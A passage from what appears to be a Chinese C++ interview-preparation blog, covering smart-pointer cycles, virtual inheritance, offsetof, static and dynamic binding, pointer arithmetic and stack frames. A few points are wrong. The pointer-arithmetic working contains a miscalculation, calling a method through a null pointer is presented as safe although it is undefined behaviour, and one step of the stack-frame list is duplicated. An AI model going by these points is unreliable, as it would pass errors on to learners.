punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sp1.use_count:"</span> <span class="token operator">&lt;&lt;</span> sp1<span class="token punctuation">.</span><span class="token function">use_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sp2.use_count:"</span> <span class="token operator">&lt;&lt;</span> sp2<span class="token punctuation">.</span><span class="token function">use_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>sp1<span class="token operator">-></span>_pNext <span class="token operator">=</span> sp2<span class="token punctuation">;</span> <span class="token comment">//sp1的引用+1</span>sp2<span class="token operator">-></span>_pPre <span class="token operator">=</span> sp1<span class="token punctuation">;</span> <span class="token comment">//sp2的引用+1</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sp1.use_count:"</span> <span class="token operator">&lt;&lt;</span> sp1<span class="token punctuation">.</span><span class="token function">use_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sp2.use_count:"</span> <span class="token operator">&lt;&lt;</span> sp2<span class="token punctuation">.</span><span class="token function">use_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">Funtest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果</span><span class="token comment">//Node()</span><span class="token comment">//Node()</span><span class="token comment">//sp1.use_count:1</span><span class="token comment">//sp2.use_count:1</span><span class="token comment">//sp1.use_count:2</span><span class="token comment">//sp2.use_count:2</span></code></pre><p>从上面shared_ptr的实现中我们知道了只有当引用计数减减之后等于0，析构时才会释放对象，而上述情况造成了一个僵局，那就是析构对象时先析构sp2,可是由于sp2的空间sp1还在使用中，所以sp2.use_count减减之后为1，不释放，sp1也是相同的道理，由于sp1的空间sp2还在使用中，所以sp1.use_count减减之后为1，也不释放。sp1等着sp2先释放，sp2等着sp1先释放,二者互不相让，导致最终都没能释放，内存泄漏。</p><p>在实际编程过程中，应该尽量避免出现智能指针之前相互指向的情况，如果不可避免，可以使用使用弱指针——weak_ptr，它不增加引用计数，只要出了作用域就会自动析构。</p><blockquote><p>《c 智能指针（及循环引用问题）》：<a href="https://blog.csdn.net/m0_37968340/article/details/76737395">https://blog.csdn.net/m0_37968340/article/details/76737395</a></p></blockquote><h4 id="97、什么是虚拟继承"><a href="#97、什么是虚拟继承" class="headerlink" title="97、什么是虚拟继承"></a>97、什么是虚拟继承</h4><p>由于c支持多继承，除了public、protected和private三种继承方式外，还支持虚拟（virtual）继承，举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class A<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>class B <span class="token operator">:</span> virtual public A<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class C <span class="token operator">:</span> virtual public A<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class D <span class="token operator">:</span> public B<span class="token punctuation">,</span> public C<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sizeof(A)："</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">sizeof</span> A <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">// 1，空对象，只有一个占位</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sizeof(B)："</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">sizeof</span> B <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">// 4，一个bptr指针，省去占位,不需要对齐</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sizeof(C)："</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">sizeof</span> C <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">// 4，一个bptr指针，省去占位,不需要对齐</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sizeof(D)："</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">sizeof</span> D <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">// 8，两个bptr，省去占位,不需要对齐</span><span class="token punctuation">&#125;</span></code></pre><p>上述代码所体现的关系是，B和C虚拟继承A，D又公有继承B和C，这种方式是一种<strong>菱形继承或者钻石继承</strong>，可以用如下图来表示</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1565960190086.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1565961214248.png" alt=""></p><p><strong>虚拟继承的情况下，无论基类被继承多少次，只会存在一个实体。</strong>虚拟继承基类的子类中，子类会增加某种形式的指针，或者指向虚基类子对象，或者指向一个相关的表格；表格中存放的不是虚基类子对象的地址，就是其偏移量，此类指针被称为bptr，如上图所示。如果既存在vptr又存在bptr，某些编译器会将其优化，合并为一个指针</p><h4 id="98、如何获得结构成员相对于结构开头的字节偏移量"><a href="#98、如何获得结构成员相对于结构开头的字节偏移量" class="headerlink" title="98、如何获得结构成员相对于结构开头的字节偏移量"></a>98、如何获得结构成员相对于结构开头的字节偏移量</h4><p>使用<stddef.h>头文件中的，offsetof宏。</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">struct</span>  <span class="token class-name">S</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token keyword">char</span> y<span class="token punctuation">;</span><span class="token keyword">int</span> z<span class="token punctuation">;</span><span class="token keyword">double</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> x<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 0</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 4</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> z<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 8</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 12</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>在VS2019 <span class="token operator">+</span> win下 并不是这样的        cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> x<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 0</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 4</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> z<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 8</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 16 这里是 16的位置，因为 double是8字节，需要找一个8的倍数对齐，</span>当然了，如果加上  #pragma <span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>指定 <span class="token number">4</span>字节对齐就可以了<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></span></span><span class="token keyword">struct</span>  <span class="token class-name">S</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token keyword">char</span> y<span class="token punctuation">;</span><span class="token keyword">int</span> z<span class="token punctuation">;</span><span class="token keyword">double</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">test02</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> x<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 0</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 4</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> z<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 8</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 12</span>    ｝</code></pre><p>S结构体中各个数据成员的内存空间划分如下所示，需要注意内存对齐</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566055549125.png" alt=""></p><h4 id="99、静态类型和动态类型，静态绑定和动态绑定的介绍"><a href="#99、静态类型和动态类型，静态绑定和动态绑定的介绍" class="headerlink" title="99、静态类型和动态类型，静态绑定和动态绑定的介绍"></a>99、静态类型和动态类型，静态绑定和动态绑定的介绍</h4><ul><li>静态类型：对象在声明时采用的类型，在编译期既已确定；</li><li>动态类型：通常是指一个指针或引用目前所指对象的类型，是在运行期决定的；</li><li>静态绑定：绑定的是静态类型，所对应的函数或属性依赖于对象的静态类型，发生在编译期；</li><li>动态绑定：绑定的是动态类型，所对应的函数或属性依赖于对象的动态类型，发生在运行期；</li></ul><p>从上面的定义也可以看出，非虚函数一般都是静态绑定，而虚函数都是动态绑定（如此才可实现多态性）。<br>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token comment">/*virtual*/</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A::func()\n"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class B <span class="token operator">:</span> public A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"B::func()\n"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class C <span class="token operator">:</span> public A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"C::func()\n"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>C<span class="token operator">*</span> pc <span class="token operator">=</span> new <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//pc的静态类型是它声明的类型C*，动态类型也是C*；</span>B<span class="token operator">*</span> pb <span class="token operator">=</span> new <span class="token function">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//pb的静态类型和动态类型也都是B*；</span>A<span class="token operator">*</span> pa <span class="token operator">=</span> pc<span class="token punctuation">;</span>      <span class="token comment">//pa的静态类型是它声明的类型A*，动态类型是pa所指向的对象pc的类型C*；</span>pa <span class="token operator">=</span> pb<span class="token punctuation">;</span>         <span class="token comment">//pa的动态类型可以更改，现在它的动态类型是B*，但其静态类型仍是声明时候的A*；</span>C <span class="token operator">*</span>pnull <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">//pnull的静态类型是它声明的类型C*,没有动态类型，因为它指向了NULL；</span>        pa<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//A::func() pa的静态类型永远都是A*，不管其指向的是哪个子类，都是直接调用A::func()；</span>pc<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//C::func() pc的动、静态类型都是C*，因此调用C::func()；</span>pnull<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//C::func() 不用奇怪为什么空指针也可以调用函数，因为这在编译期就确定了，和指针空不空没关系；</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>如果将A类中的virtual注释去掉，则运行结果是：</p><pre class="language-c" data-language="c"><code class="language-c">pa<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//B::func() 因为有了virtual虚函数特性，pa的动态类型指向B*，因此先在B中查找，找到后直接调用；</span>pc<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//C::func() pc的动、静态类型都是C*，因此也是先在C中查找；</span>pnull<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//空指针异常，因为是func是virtual函数，因此对func的调用只能等到运行期才能确定，然后才发现pnull是空指针；</span></code></pre><p>在上面的例子中，</p><ul><li><p>如果基类A中的func不是virtual函数，那么不论pa、pb、pc指向哪个子类对象，对func的调用都是在定义pa、pb、pc时的静态类型决定，早已在编译期确定了。</p></li><li><p>同样的空指针也能够直接调用no-virtual函数而不报错（这也说明一定要做空指针检查啊！），因此静态绑定不能实现多态；</p></li><li><p>如果func是虚函数，那所有的调用都要等到运行时根据其指向对象的类型才能确定，比起静态绑定自然是要有性能损失的，但是却能实现多态特性；</p><p><strong>本文代码里都是针对指针的情况来分析的，但是对于引用的情况同样适用。</strong></p></li></ul><p>至此总结一下静态绑定和动态绑定的区别：</p><ul><li><p>静态绑定发生在编译期，动态绑定发生在运行期；</p></li><li><p>对象的动态类型可以更改，但是静态类型无法更改；</p></li><li><p>要想实现动态，必须使用动态绑定；</p></li><li><p>在继承体系中只有虚函数使用的是动态绑定，其他的全部是静态绑定；</p><p><strong>建议：</strong></p></li></ul><p>绝对不要重新定义继承而来的非虚(non-virtual)函数（《Effective c 第三版》条款36），因为这样导致函数调用由对象声明时的静态类型确定了，而和对象本身脱离了关系，没有多态，也这将给程序留下不可预知的隐患和莫名其妙的BUG；另外，在动态绑定也即在virtual函数中，要注意默认参数的使用。当缺省参数和virtual函数一起使用的时候一定要谨慎，不然出了问题怕是很难排查。<br>看下面的代码：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class E<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>virtual <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"E::func()\t"</span> <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class F <span class="token operator">:</span> public E<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>virtual <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"F::func()\t"</span> <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>F<span class="token operator">*</span> pf <span class="token operator">=</span> new <span class="token function">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>E<span class="token operator">*</span> pe <span class="token operator">=</span> pf<span class="token punctuation">;</span>pf<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//F::func() 1  正常，就该如此；</span>pe<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//F::func() 0  哇哦，这是什么情况，调用了子类的函数，却使用了基类中参数的默认值！</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>《c中的静态绑定和动态绑定》：<a href="https://www.cnblogs.com/lizhenghn/p/3657717.html">https://www.cnblogs.com/lizhenghn/p/3657717.html</a></p></blockquote><h4 id="100、c-11有哪些新特性？"><a href="#100、c-11有哪些新特性？" class="headerlink" title="100、c 11有哪些新特性？"></a>100、c 11有哪些新特性？</h4><ul><li>nullptr替代 NULL</li><li>引入了 auto 和 decltype 这两个关键字实现了类型推导</li><li>基于范围的 for 循环for(auto&amp; i : res){}</li><li>类和结构体的中初始化列表</li><li>Lambda 表达式（匿名函数）</li><li>std::forward_list（单向链表）</li><li>右值引用和move语义</li></ul><ul><li>…</li></ul><h4 id="101、引用是否能实现动态绑定，为什么可以实现？"><a href="#101、引用是否能实现动态绑定，为什么可以实现？" class="headerlink" title="101、引用是否能实现动态绑定，为什么可以实现？"></a>101、引用是否能实现动态绑定，为什么可以实现？</h4><p>可以。</p><p>引用在创建的时候必须初始化，在访问虚函数时，编译器会根据其所绑定的对象类型决定要调用哪个函数。注意只能调用虚函数。</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class Base <span class="token punctuation">&#123;</span>public<span class="token operator">:</span>virtual <span class="token keyword">void</span>  <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"base :: fun()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Son <span class="token operator">:</span> public Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>virtual <span class="token keyword">void</span>  <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"son :: fun()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"son :: not virtual function"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Son s<span class="token punctuation">;</span>Base<span class="token operator">&amp;</span> b <span class="token operator">=</span> s<span class="token punctuation">;</span> <span class="token comment">// 基类类型引用绑定已经存在的Son对象，引用必须初始化</span>s<span class="token punctuation">.</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//son::fun()</span>b<span class="token punctuation">.</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//son :: fun()</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>需要说明的是虚函数才具有动态绑定</strong>，上面代码中，Son类中还有一个非虚函数func()，这在b对象中是无法调用的，如果使用基类指针来指向子类也是一样的。</p><h4 id="102、全局变量和局部变量有什么区别？"><a href="#102、全局变量和局部变量有什么区别？" class="headerlink" title="102、全局变量和局部变量有什么区别？"></a>102、全局变量和局部变量有什么区别？</h4><p>生命周期不同：全局变量随主程序创建和创建，随主程序销毁而销毁；局部变量在局部函数内部，甚至局部循环体等内部存在，退出就不存在；</p><p>使用方式不同：通过声明后全局变量在程序的各个部分都可以用到；局部变量分配在堆栈区，只能在局部使用。 </p><p>操作系统和编译器通过内存分配的位置可以区分两者，全局变量分配在全局数据段并且在程序开始运行的时候被加载。局部变量则分配在堆栈里面 。</p><blockquote><p>《c经典面试题》：<a href="https://www.cnblogs.com/yjd_hycf_space/p/7495640.html">https://www.cnblogs.com/yjd_hycf_space/p/7495640.html</a></p></blockquote><h4 id="103、指针加减计算要注意什么？"><a href="#103、指针加减计算要注意什么？" class="headerlink" title="103、指针加减计算要注意什么？"></a>103、指针加减计算要注意什么？</h4><p>指针加减本质是对其所指地址的移动，移动的步长跟指针的类型是有关系的，因此在涉及到指针加减运算需要十分小心，加多或者减多都会导致指针指向一块未知的内存地址，如果再进行操作就会很危险。</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>b<span class="token punctuation">,</span> c<span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x500</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x520</span><span class="token punctuation">;</span>c <span class="token operator">=</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 8</span>a <span class="token operator">+=</span> <span class="token number">0x020</span><span class="token punctuation">;</span>c <span class="token operator">=</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// -24</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>首先变量a和b都是以16进制的形式初始化，将它们转成10进制分别是1280（5*16\^2=1280）和1312（5*16\^2+2*16=1312)， 那么它们的差值为32，也就是说a和b所指向的地址之间间隔32个位，但是考虑到是int类型占4位，所以c的值为32/4=8</p><p>a自增16进制0x20之后，其实际地址变为1280 + 2*16*4 = 1408，（因为一个int占4位，所以要乘4），这样它们的差值就变成了1312 - 1280 = -96，所以c的值就变成了-96/4 = -24</p><p>遇到指针的计算，<strong>需要明确的是指针每移动一位，它实际跨越的内存间隔是指针类型的长度，建议都转成10进制计算，计算结果除以类型长度取得结果</strong></p><h4 id="104、-怎样判断两个浮点数是否相等？"><a href="#104、-怎样判断两个浮点数是否相等？" class="headerlink" title="104、 怎样判断两个浮点数是否相等？"></a>104、 怎样判断两个浮点数是否相等？</h4><p>对两个浮点数判断大小和是否相等不能直接用==来判断，会出错！明明相等的两个数比较反而是不相等！对于两个浮点数比较只能通过相减并与预先设定的精度比较，记得要取绝对值！浮点数与0的比较也应该注意。与浮点数的表示方式有关。</p><h4 id="105、方法调用的原理（栈，汇编）"><a href="#105、方法调用的原理（栈，汇编）" class="headerlink" title="105、方法调用的原理（栈，汇编）"></a>105、方法调用的原理（栈，汇编）</h4><p>1)  机器用栈来传递过程参数、存储返回信息、保存寄存器用于以后恢复，以及本地存储。而为单个过程分配的那部分栈称为帧栈；帧栈可以认为是程序栈的一段，它有两个端点，一个标识起始地址，一个标识着结束地址，两个指针结束地址指针esp，开始地址指针ebp;</p><p>2)  由一系列栈帧构成，这些栈帧对应一个过程，而且每一个栈指针+4的位置存储函数返回地址；每一个栈帧都建立在调用者的下方，当被调用者执行完毕时，这一段栈帧会被释放。由于栈帧是向地址递减的方向延伸，因此如果我们将栈指针减去一定的值，就相当于给栈帧分配了一定空间的内存。如果将栈指针加上一定的值，也就是向上移动，那么就相当于压缩了栈帧的长度，也就是说内存被释放了。</p><p>3)  过程实现</p><p>①   备份原来的帧指针，调整当前的栈帧指针到栈指针位置；</p><p>②   建立起来的栈帧就是为被调用者准备的，当被调用者使用栈帧时，需要给临时变量分配预留内存；</p><p>③   使用建立好的栈帧，比如读取和写入，一般使用mov，push以及pop指令等等。</p><p>④   恢复被调用者寄存器当中的值，这一过程其实是从栈帧中将备份的值再恢复到寄存器，不过此时这些值可能已经不在栈顶了</p><p>⑤   恢复被调用者寄存器当中的值，这一过程其实是从栈帧中将备份的值再恢复到寄存器，不过此时这些值可能已经不在栈顶了。</p><p>⑥   释放被调用者的栈帧，释放就意味着将栈指针加大，而具体的做法一般是直接将栈指针指向帧指针，因此会采用类似下面的汇编代码处理。</p><p>⑦   恢复调用者的栈帧，恢复其实就是调整栈帧两端，使得当前栈帧的区域又回到了原始的位置。</p><p>⑧   弹出返回地址，跳出当前过程，继续执行调用者的代码。</p><p>4)  过程调用和返回指令</p><p>①   call指令</p><p>②   leave指令</p><p>③   ret指令</p><p>​                                </p><h4 id="106、c中的指针参数传递和引用参数传递有什么区别？底层原理你知道吗？"><a href="#106、c中的指针参数传递和引用参数传递有什么区别？底层原理你知道吗？" class="headerlink" title="106、c中的指针参数传递和引用参数传递有什么区别？底层原理你知道吗？"></a>106、c中的指针参数传递和引用参数传递有什么区别？底层原理你知道吗？</h4><p><strong>1)</strong> 